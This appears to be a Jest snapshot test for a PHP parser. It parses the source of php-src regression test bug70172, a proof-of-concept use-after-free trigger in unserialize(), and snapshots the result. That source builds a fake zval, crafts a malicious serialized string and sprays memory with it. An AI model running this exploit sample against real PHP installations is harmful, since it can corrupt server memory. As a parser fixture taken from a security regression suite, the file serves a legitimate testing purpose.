// eslint-disable prettier/prettier
const parser = require("../main");

describe("php-src tests", function () {
  // ext/standard/tests/serialize/bug70172.phpt
  it("Bug #70172 - Use After Free Vulnerability in unserialize()", function () {
    expect(parser.parseCode("<?php\nclass obj implements Serializable {\n    var $data;\n    function serialize() {\n        return serialize($this->data);\n    }\n    function unserialize($data) {\n        $this->data = unserialize($data);\n    }\n}\n$fakezval = ptr2str(1122334455);\n$fakezval .= ptr2str(0);\n$fakezval .= \"\\x00\\x00\\x00\\x00\";\n$fakezval .= \"\\x01\";\n$fakezval .= \"\\x00\";\n$fakezval .= \"\\x00\\x00\";\n$inner = 'R:2;';\n$exploit = 'a:2:{i:0;i:1;i:1;C:3:\"obj\":'.strlen($inner).':{'.$inner.'}}';\n$data = unserialize($exploit);\nfor ($i = 0; $i < 5; $i++) {\n    $v[$i] = $fakezval.$i;\n}\nvar_dump($data);\nfunction ptr2str($ptr)\n{\n    $out = '';\n    for ($i = 0; $i < 8; $i++) {\n        $out .= chr($ptr & 0xff);\n        $ptr >>= 8;\n    }\n    return $out;\n}\n?>")).toMatchSnapshot();
  });
});
